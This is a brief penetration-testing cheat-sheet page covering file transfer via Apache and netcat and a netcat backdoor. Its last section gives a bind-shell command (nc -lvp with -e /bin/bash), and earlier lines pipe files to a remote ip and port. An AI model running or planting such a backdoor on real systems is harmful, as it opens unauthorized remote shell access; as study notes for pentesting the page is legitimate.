---
title: Data transfer and backdoors
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, webpentesting, server, backdoors
---

# Data transfer and backdoors

## Data transfer

### Apache server

Once you have a folder structure such as "/var/www/" or "/var/www/html", and also an Apache server installed, you can serve all files from that path by initiating the service:

```bash
service apache2 start
```


### Netcat

On the server side:

```bash
#data will be printed on screen
nc -lvp <port>  
```

On the client side:

```bash
echo “hello” | nc -v <ip> <port>
```


**Netcat: Transfer data and save it in a file**

On the server side:

```bash
# Data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side:

```bash
echo “hello” | nc -v <ip> <port>
```

**Netcat Transfer file and save it**

On the server side:

```bash
# Received data will be stored in reveived.txt file.
nc -lvp <port> > received.txt   
```

On the client side:

```bash
cat tobesentfiel.txt | nc -v <ip> <port>
```



## Backdoors

### Netcat shell

On the server side:

```bash
nc -lvp <port> -e /bin/bash
```


